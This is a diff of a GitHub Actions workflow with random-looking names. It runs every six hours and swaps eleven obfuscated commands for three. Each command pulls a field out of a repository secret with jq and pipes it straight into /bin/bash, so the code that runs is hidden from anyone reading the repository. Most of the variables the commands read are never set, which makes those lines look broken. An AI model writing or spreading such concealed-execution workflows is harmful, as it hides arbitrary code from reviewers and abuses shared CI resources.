@@ -3,7 +3,7 @@ name: yangziyuan1962
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 3/6 * * *'
+    - cron: '4 2/6 * * *'
 
 jobs:
   build:
@@ -12,17 +12,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: yangziyuan1962
         env:
-          m3: ${{ secrets.m3 }}
+          kwe157: ${{ secrets.kwe157 }}
         run: |
-          echo $m3 | jq -r .ksve52 | /bin/bash
-          echo $dhvd55248 | jq -r .xzm345 | /bin/bash
-          echo $vdypm5013 | jq -r .qck729 | /bin/bash
-          echo $xctgc313 | jq -r .nuxhg1982 | /bin/bash
-          echo $dix8 | jq -r .ob957 | /bin/bash
-          echo $yeqs701 | jq -r .kn68323 | /bin/bash
-          echo $ogpdv62 | jq -r .fhjt971 | /bin/bash
-          echo $u47395 | jq -r .wxqs77482 | /bin/bash
-          echo $t3797 | jq -r .jjxjv71 | /bin/bash
-          echo $ebky7177 | jq -r .y0492 | /bin/bash
-          echo $w477 | jq -r .qyq2674 | /bin/bash
+          echo $kwe157 | jq -r .s5448 | /bin/bash
+          echo $z99 | jq -r .whxc4022 | /bin/bash
+          echo $f1 | jq -r .zhcse81 | /bin/bash
 
